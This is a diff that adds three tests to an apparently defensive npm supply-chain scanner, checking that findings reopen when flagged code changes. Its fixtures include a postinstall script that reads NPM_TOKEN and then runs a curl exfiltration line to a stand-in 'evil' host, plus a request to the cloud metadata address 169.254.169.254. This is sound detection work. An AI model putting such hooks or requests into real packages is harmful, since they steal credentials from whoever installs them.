@@ -616,6 +616,54 @@ def test_outbound_host_config_opener_after_unmatched_closer_binds():
     )
 
 
+def test_outbound_host_multiline_template_literal_reopens():
+    # A ) inside a multi-line backtick template literal must not close the call
+    # early; the options object after the template binds, so a changed header
+    # reopens rather than riding the unchanged host (a per-line string blanker
+    # cannot mask a template literal that spans lines).
+    old = "request(`http://169.254.169.254/x\n)`, {\n  headers: {a: 'old'},\n});\n"
+    new = "request(`http://169.254.169.254/x\n)`, {\n  headers: {a: 'evil'},\n});\n"
+    assert snp._finding_key(_host_finding(old)) != snp._finding_key(_host_finding(new))
+
+
+def test_cred_env_lifecycle_binds_whole_body():
+    # cred-env-in-lifecycle evidence pins the whole script body, so a changed
+    # non-token line (echo safe -> curl exfil) reopens even with the token line
+    # unchanged.
+    def life(body):
+        pkg = snp.PackageEntry(
+            name = "e",
+            version = "1.0.0",
+            resolved = "https://registry.npmjs.org/e/-/e-1.0.0.tgz",
+            integrity = "sha512-x",
+            lockfile_key = "node_modules/e",
+        )
+        text = json.dumps({"scripts": {"postinstall": body}})
+        return [
+            f
+            for f in snp.scan_package_json(pkg, "package/package.json", text)
+            if "cred-env-in-lifecycle" in f.pattern
+        ][0]
+
+    safe = life("node -e 'console.log(process.env.NPM_TOKEN)'; echo safe")
+    evil = life("node -e 'console.log(process.env.NPM_TOKEN)'; curl -d x https://evil")
+    assert "body-sha256:" in safe.evidence
+    assert snp._finding_key(safe) != snp._finding_key(evil)
+
+
+def test_evidence_caps_match_count_with_digest_remainder():
+    # Past _MAX_EVIDENCE_MATCHES the evidence folds the remaining matches into one
+    # digest so a huge/minified file cannot build an unbounded evidence string,
+    # while a changed match count past the cap still reopens.
+    over = snp._MAX_EVIDENCE_MATCHES + 20
+    base = "".join(f"x{i} = process.env.NPM_TOKEN\n" for i in range(over))
+    ev = snp._evidence(base, snp._JS_ENV_TOKEN)
+    assert "more) sha256:" in ev
+    assert ev.count(" | ") <= snp._MAX_EVIDENCE_MATCHES  # bounded, not `over` spans
+    less = "".join(f"x{i} = process.env.NPM_TOKEN\n" for i in range(over - 1))
+    assert snp._evidence_hash(ev) != snp._evidence_hash(snp._evidence(less, snp._JS_ENV_TOKEN))
+
+
 def test_outbound_host_config_reindent_is_stable():
     # A formatter-only reindent of the bound continuation lines must NOT change
     # the key (whitespace is normalized before the logical-line digest).
